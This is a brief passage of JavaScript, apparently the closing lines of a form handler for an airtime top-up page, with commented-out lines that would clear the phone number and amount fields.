  // Optional: you can clear the form fields after showing the message
  // document.getElementById("phoneNumber").value = "";
  // document.getElementById("airtimeAmount").value = "";
}